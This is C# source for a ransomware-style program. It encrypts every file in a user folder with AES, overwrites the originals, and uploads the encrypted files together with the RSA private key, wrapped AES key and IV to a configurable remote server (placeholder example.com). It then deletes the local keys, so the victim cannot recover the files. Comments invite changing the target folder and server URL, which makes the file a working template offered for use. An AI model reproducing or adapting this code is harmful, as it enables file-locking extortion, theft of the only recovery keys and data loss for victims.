using System;
using System.IO;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Net.Http;
using System.Threading.Tasks;

public class Program
{
    // Entry point of the program
    static async Task Main()
    {
        // 🔹 Set the target folder where files will be encrypted
        // Users can change "ranstest" to any folder name in their user profile
        string folderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "ranstest");

        // Get all files in the target folder
        string[] files = Directory.GetFiles(folderPath);

        // 🔹 Set up a folder on the Desktop to save encryption keys
        // Users can rename "ranstest_keys" if desired
        string keysDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "ranstest_keys");
        Directory.CreateDirectory(keysDir);

        // 🔹 Define paths for RSA and AES keys
        string rsaPrivateXml = Path.Combine(keysDir, "privatekey.xml"); // RSA private key
        string rsaPublicXml = Path.Combine(keysDir, "publickey.xml");   // RSA public key
        string wrappedKeyFile = Path.Combine(keysDir, "aes_key.enc");   // AES key encrypted with RSA
        string ivFile = Path.Combine(keysDir, "aes_iv.bin");            // AES initialization vector

        // 🔹 Generate RSA and AES keys (runs only once)
        using (var rsa = new RSACryptoServiceProvider(1024))
        {
            rsa.PersistKeyInCsp = false; // Keys will not persist in Windows key store

            // Export RSA keys to XML format
            string privXml = rsa.ToXmlString(true);  // Private key
            string pubXml = rsa.ToXmlString(false);  // Public key
            File.WriteAllText(rsaPrivateXml, privXml);
            File.WriteAllText(rsaPublicXml, pubXml);

            // 🔹 Create AES instance for symmetric encryption
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 128;                // AES-128
                aes.Mode = CipherMode.CBC;        // CBC mode (secure)
                aes.Padding = PaddingMode.PKCS7;  // PKCS7 padding
                aes.GenerateKey();                // Generate a random AES key
                aes.GenerateIV();                 // Generate a random initialization vector

                // Save IV to file (needed for decryption)
                File.WriteAllBytes(ivFile, aes.IV);

                // 🔹 Encrypt the AES key with RSA public key
                byte[] wrappedKey = rsa.Encrypt(aes.Key, true);
                File.WriteAllBytes(wrappedKeyFile, wrappedKey);

                // 🔹 Encrypt each file in the target folder
                foreach (string file in files)
                {
                    byte[] plaintext = File.ReadAllBytes(file);
                    byte[] cipher;

                    using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                    using (var ms = new MemoryStream())
                    {
                        using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                        {
                            cs.Write(plaintext, 0, plaintext.Length);
                            cs.FlushFinalBlock();
                        }
                        cipher = ms.ToArray();
                    }

                    File.WriteAllBytes(file, cipher); // Overwrite the original file with encrypted data
                    Console.WriteLine("Encrypted file: " + file);
                }
            }
        }

        Console.WriteLine("RSA and AES keys created and all files encrypted.");

        // 🔹 Upload encrypted files and keys to server
        await UploadFilesAsync(files, keysDir);

        // 🔹 Delete local keys for security
        DeleteKeys(keysDir);
    }

    /// <summary>
    /// Uploads encrypted files and keys to a remote server
    /// Users should change 'uploadUrl' to their server URL
    /// </summary>
    static async Task UploadFilesAsync(string[] encryptedFiles, string keysDir)
    {
        string uploadUrl = "http://example.com/server.php"; // Change this to your server

        // Combine encrypted files and key files into one array
        string[] filesToSend = new string[encryptedFiles.Length + 4];

        // Add encrypted files first
        for (int i = 0; i < encryptedFiles.Length; i++)
        {
            filesToSend[i] = encryptedFiles[i];
        }

        // Add AES and RSA key files
        filesToSend[encryptedFiles.Length + 0] = Path.Combine(keysDir, "aes_iv.bin");
        filesToSend[encryptedFiles.Length + 1] = Path.Combine(keysDir, "privatekey.xml");
        filesToSend[encryptedFiles.Length + 2] = Path.Combine(keysDir, "publickey.xml");
        filesToSend[encryptedFiles.Length + 3] = Path.Combine(keysDir, "aes_key.enc");

        using var client = new HttpClient();

        foreach (string filePath in filesToSend)
        {
            if (!File.Exists(filePath))
            {
                Console.WriteLine("File not found: " + filePath);
                continue;
            }

            using var form = new MultipartFormDataContent();
            using var fileStream = File.OpenRead(filePath);
            form.Add(new StreamContent(fileStream), "file", Path.GetFileName(filePath));

            try
            {
                Console.WriteLine($"Uploading: {Path.GetFileName(filePath)}...");
                HttpResponseMessage response = await client.PostAsync(uploadUrl, form);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine("Server response: " + result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error uploading: " + ex.Message);
            }
        }
    }

    /// <summary>
    /// Deletes local keys after use
    /// Ensures sensitive key material does not remain on disk
    /// </summary>
    static void DeleteKeys(string keysDir)
    {
        try
        {
            foreach (string file in Directory.GetFiles(keysDir))
            {
                File.Delete(file);
                Console.WriteLine("Deleted: " + file);
            }

            // Optionally delete the keys directory itself
            Directory.Delete(keysDir, true);
            Console.WriteLine("Deleted keys directory: " + keysDir);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error deleting keys: " + ex.Message);
        }
    }
}
